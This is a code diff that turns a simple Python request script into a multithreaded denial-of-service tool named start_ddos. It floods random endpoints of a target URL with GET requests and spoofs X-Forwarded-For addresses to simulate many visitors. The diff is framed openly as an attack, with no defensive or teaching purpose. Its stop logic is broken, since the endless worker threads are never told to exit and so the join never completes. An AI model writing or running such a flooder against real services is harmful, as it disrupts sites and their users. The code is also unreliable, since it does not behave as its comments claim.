@@ -1,24 +1,45 @@
 import requests
 import threading
+import random
+import time
 
-# generated scipt by chat GPT
-# TODO : Implement the DDoS attack later
+# Default number of threads to use for the attack
+threads_count = 100
 
-def send_requests(url, num_requests):
-    for i in range(num_requests):
+# Function to send random GET requests
+def send_request(endpoint, callback=print):
+    while True:
         try:
-            response = requests.get(url)
-            print(f"[{i+1}] Statut: {response.status_code}")
-        except requests.RequestException as e:
-            print(f"Erreur: {e}")
+            # Generate a random IP to simulate different visitors
+            ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "X-Forwarded-For": ip
+            }
+            # Send the GET request to the endpoint
+            response = requests.get(endpoint, headers=headers)
+            callback(f"Request sent to {endpoint} with IP {ip}, status: {response.status_code}")
+        except Exception as e:
+            callback(f"Error sending request to {endpoint}: {e}")
+        time.sleep(random.uniform(0.1, 1))  # Random pause between requests
 
-
-def simulate_ddos(url, num_threads, requests_per_thread):
+# Function to start the threads with a timeout duration
+def start_ddos(url, endpoints, threads_count=threads_count, duration=60, callback=print):
     threads = []
-    for i in range(num_threads):
-        thread = threading.Thread(target=send_requests, args=(url, requests_per_thread))
+    start_time = time.time()
+
+    # Start the threads
+    for i in range(threads_count):
+        endpoint = random.choice(endpoints)  # Choose a random endpoint
+        thread = threading.Thread(target=send_request, args=(url + endpoint,))
         threads.append(thread)
         thread.start()
 
+    # Run for the specified duration
+    while time.time() - start_time < duration:
+        pass
+
+    # Stop the attack after the duration has passed
+    callback("Attack duration completed. Stopping threads.")
     for thread in threads:
-        thread.join()
+        thread.join()  # Ensure threads complete their execution
